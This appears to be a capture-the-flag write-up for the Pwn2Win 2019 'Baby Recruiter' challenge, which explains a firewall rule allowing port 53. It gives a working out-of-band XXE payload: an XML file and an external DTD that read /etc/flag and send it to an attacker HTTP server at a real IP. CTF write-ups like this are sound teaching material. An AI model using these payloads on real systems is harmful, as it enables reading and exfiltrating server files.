# Pwn2Win CTF 2019 - Baby Recruiter - Writeup

In the rules iptabes.sh is written.
```sh
## This should be one of the first rules.
## so dns lookups are already allowed for your other rules
$ IPT -A OUTPUT -p udp --dport 53 -m state --state NEW, ESTABLISHED -j ACCEPT
$ IPT -A INPUT -p udp --sport 53 -m state --state ESTABLISHED -j ACCEPT
$ IPT -A OUTPUT -p tcp --dport 53 -m state --state NEW, ESTABLISHED -j ACCEPT
$ IPT -A INPUT -p tcp --sport 53 -m state --state ESTABLISHED -j ACCEPT
```

Input and output on port 53 is enabled, we can approve of this rule.

In the challenge page we will send the payload.

![](https://github.com/andersongomes001/ctf_scripts/blob/master/FireShot%20Capture%20022%20-%20Resume%20-%2038.240.15.141.png?raw=true)

On the server let's open an http server on port 53.

start_server.sh
```
echo $(curl -s ifconfig.me/ip)
systemctl stop systemd-resolved
php -S 0.0.0.0:53
```
payload.xml
```
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE data SYSTEM "http://51.158.67.1:53/file.dtd">
<data>&send;</data>
```
file.dtd
```
<!ENTITY % file SYSTEM "file:///etc/flag">
<!ENTITY % all "<!ENTITY send SYSTEM 'http://51.158.67.1:53/?%file;'>">
%all;
```

![](https://github.com/andersongomes001/ctf_scripts/blob/master/Captura%20de%20tela%20de%202019-11-11%2010-42-54.png?raw=true)
